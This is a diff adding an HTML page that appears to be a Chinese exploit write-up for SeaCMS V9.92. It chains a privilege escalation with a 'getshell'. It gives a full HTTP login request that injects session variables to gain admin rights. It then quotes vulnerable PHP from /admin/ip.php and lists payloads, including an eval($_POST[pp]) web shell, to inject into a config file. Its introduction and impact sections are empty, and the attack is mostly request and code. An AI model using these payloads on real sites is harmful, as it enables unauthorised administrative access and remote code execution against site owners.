@@ -1,0 +1,44 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
+			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
+			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
+			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
+			.csBF12A472{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:italic;}
+			.cs6EDCDAE2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:italic;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
+			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
+			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
+			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
+		</style>
+	</head>
+	<body>
+		<h1 class="csAD577193">
+			<a name="seacms-v992-越权getshell"><span class="csDE05BCC">Seacms V9.92 </span><span class="csECDA2D3">越权</span><span class="csDE05BCC">+Getshell</span></a></h1>
+		<h2 class="cs868C439D">
+			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
+		<h2 class="cs868C439D">
+			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
+		<h2 class="cs868C439D">
+			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
+		<h3 class="cs868C439D">
+			<a name="越权"><span class="csD6CA00D2">越权</span></a></h3>
+		<h4 class="cs868C439D">
+			<a name="Xbfb877148a9fff2e8c6f235a2520a469b986705"><span class="csBF12A472">1</span><span class="cs6EDCDAE2">、首先注册一个普通用户</span></a></h4>
+		<h4 class="cs868C439D">
+			<a name="X2ec07f5c217c13a2f3038a42144d8946517bbd9"><span class="csBF12A472">2</span><span class="cs6EDCDAE2">、</span><span class="csBF12A472">burp</span><span class="cs6EDCDAE2">抓包改包，下面是发送</span><span class="csBF12A472">payload</span></a></h4>
+		<p class="cs3A447A38"><span class="cs9FB05234">POST /login.php HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: 0-sec.org</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 49</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Cache-Control: max-age=0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Origin: http://192.168.8.143</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Upgrade-Insecure-Requests: 1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">DNT: 1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: application/x-www-form-urlencoded</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Referer: http://192.168.8.143/login.php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Encoding: gzip, deflate</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Language: zh-CN,zh;q=0.9</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Cookie: PHPSESSID=9smu8an6nvbrqasp5m0o4bmts7</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">dopost=login&amp;userid=test&amp;pwd=123456&amp;validate=djyf&amp;_SESSION[sea_admin_id]=1&amp;_SESSION[sea_ckstr]=djyf</span></p><h4 class="cs868C439D">
+			<a name="Xf37667467656b3358027a868e28a040d3c8a18c"><span class="csBF12A472">3</span><span class="cs6EDCDAE2">、</span><span class="csBF12A472"> </span><span class="cs6EDCDAE2">登陆后台页面，可以发现管理员账户变成</span><span class="csBF12A472">-1</span><span class="cs6EDCDAE2">了</span><span class="csBF12A472">,</span><span class="cs6EDCDAE2">也同时拥有管理员的权限</span></a></h4>
+		<h3 class="cs868C439D">
+			<a name="getshell"><span class="csD1E291E2">getshell</span></a></h3>
+		<p class="cs40DD2BC9"><span class="cs8926E06">/admin/ip.php</span></p><p class="cs3A447A38"><span class="cs9FB05234">if($action==&quot;set&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$v= $_POST[&#39;v&#39;];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$ip = $_POST[&#39;ip&#39;];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$open=fopen(&quot;../data/admin/ip.php&quot;,&quot;w&quot; );</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$str=&#39;&lt;?php &#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$str.=&#39;$v = &quot;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$str.=&quot;$v&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$str.=&#39;&quot;; &#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$str.=&#39;$ip = &quot;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$str.=&quot;$ip&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$str.=&#39;&quot;; &#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$str.=&quot; ?&gt;&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fwrite($open,$str);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fclose($open);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ShowMsg(&quot;</span><span class="cs7FFD2630">成功保存设置</span><span class="cs9FB05234">!&quot;,&quot;admin_ip.php&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;exit;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">我们再去看一下</span><span class="cs8926E06">ip.php</span><span class="cs9C1B1871">格式</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?php $v = &quot;0&quot;; $ip = &quot; &quot;; &nbsp;?&gt;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">我们可以构造一下</span><span class="cs8926E06">,</span><span class="cs9C1B1871">然后保存</span></p><p class="cs3A447A38"><span class="cs9FB05234">*;phpinfo();//</span></p><p class="cs3A447A38"><span class="cs9FB05234">&quot;;@eval($_POST[pp]);//</span></p><p class="cs40DD2BC9"><span class="cs8926E06">image</span></p></body>
+</html>
